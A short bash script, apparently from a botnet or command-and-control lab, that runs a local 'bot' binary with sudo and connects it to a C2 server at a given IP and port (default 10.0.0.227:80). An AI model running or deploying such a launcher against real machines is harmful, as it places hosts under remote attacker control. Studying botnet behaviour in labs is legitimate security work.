#!/bin/bash

C2_IP="${1:-10.0.0.227}"
C2_PORT="${2:-80}"

echo "[+] Bot connecting to $C2_IP:$C2_PORT ..."
sudo ./bot "$C2_IP:$C2_PORT"
